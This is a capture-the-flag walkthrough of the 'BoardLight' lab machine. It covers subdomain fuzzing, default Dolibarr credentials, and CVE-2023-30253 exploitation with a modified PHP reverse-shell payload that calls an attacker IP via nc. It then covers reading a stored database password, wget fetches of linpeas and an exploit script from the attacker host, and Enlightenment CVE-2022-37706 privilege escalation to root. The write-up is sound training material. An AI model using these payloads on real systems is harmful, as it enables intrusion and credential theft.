# BoardLight - Easy

```sh
sudo vim /etc/hosts
# map target IP to boardlight.htb

nmap -T4 -p- -A -Pn -v boardlight.htb
```

* open ports & services:

    * 22/tcp - OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
    * 80/tcp - Apache httpd 2.4.41

* the webpage is a standard corporate webpage for 'BoardLight', a consulting firm

* web scan:

    ```sh
    gobuster dir -u http://boardlight.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # directory scan

    gobuster dir -u http://boardlight.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 25
    # directory scan with lesser extensions
    ```

* here, the ```gobuster``` scans lead to a lot of error timeouts so we do not find any interesting webpages right away

* the webpage footer lists the email 'info@board.htb' - this provides us the domain name 'board.htb' - we can use it to possibly check for further subdomains/vhosts:

    ```sh
    sudo vim /etc/hosts
    # map target IP to board.htb

    ffuf -c -u "http://board.htb" -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25
    # identify filter size for subdomain scan

    ffuf -c -u "http://board.htb" -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 15949 -s
    # subdomain scan
    ```

* from the subdomain scan, we get a subdomain 'crm.board.htb' - add it to the hosts file:

    ```sh
    sudo vim /etc/hosts
    ```

* this webpage seems to run an instance of Dolibarr 17.0.0, and we get a login page - we can test for weak & default creds

* the creds 'admin:admin' work in this case and we are able to access the dashboard

* checking for exploits associated with this version of Dolibarr, we get a exploit [PoC for CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253):

    ```sh
    python3 CVE-2023-30253.py

    nc -nvlp 4444
    # setup listener

    python3 CVE-2023-30253.py http://crm.board.htb admin admin 10.10.14.21 4444
    # exploit does not work and we do not get a shell
    # as the exploit is able to create the site and page, we need to check the payload used

    vim CVE-2023-30253.py
    # check the payload used
    ```

* we can edit the existing payload to another one like ```<?pHp system(\"sh -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc " + lhost + " " + lport + ">/tmp/f'\"); ?>``` as a test:

    ```sh
    # after updating the payload
    python3 CVE-2023-30253.py http://crm.board.htb admin admin 10.10.14.21 4444
    # this works and we get RCE
    ```

* in reverse shell:

    ```sh
    whoami
    # www-data

    # upgrade to stable shell

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z to background shell
    stty raw -echo; fg
    # press Enter twice

    pwd
    # we are in the webroot subfolders
    # enumerate the webroot directory

    cd /var/www/html

    ls -la
    # enumerate the dolibarr webpage files

    ls -la crm.board.htb
    # check for any config info
    ```

* checking the files in the subfolder for the Dolibarr instance, we get a config file at ```/var/www/html/crm.board.htb/htdocs/conf/conf.php``` - this contains the DB connection info and includes the creds 'dolibarrowner:serverfun2$2023!!'

* additionally, checking from ```ls -la /home``` and ```cat /etc/passwd``` - we seem to have user 'larissa' on the box so we can try for password reuse first:

    ```sh
    ssh larissa@board.htb
    # the password works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # no sudo privileges

    # we can attempt initial enum using linpeas
    # fetch script from attacker

    cd /tmp
    wget http://10.10.14.21:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * box is running Linux version 5.15.0-107-generic, Ubuntu 20.04
    * multiple unknown SUID binaries for 'enlightenment' utility listed

* Googling shows that Enlightenment is a lightweight desktop environment, and is likely used on the target

* searching for exploits associated with Enlightenment SUID binaries lead us to privesc exploit CVE-2022-37706 for Enlightenment v0.25.3 (or below); the vulnerable binary ```enlightenment_sys``` is also listed in the SUID binaries output from ```linpeas```

* we need to check if this is applicable here:

    ```sh
    apt show enlightenment
    # this shows the version 0.23.1-4
    ```

* we can use the [exploit for CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh) for privesc:

    ```sh
    # fetch exploit from attacker
    wget http://10.10.14.21:8000/CVE-2022-37706.sh

    chmod +x CVE-2022-37706.sh

    ./CVE-2022-37706.sh
    # this gives us root shell

    cat /root/root.txt
    # root flag
    ```
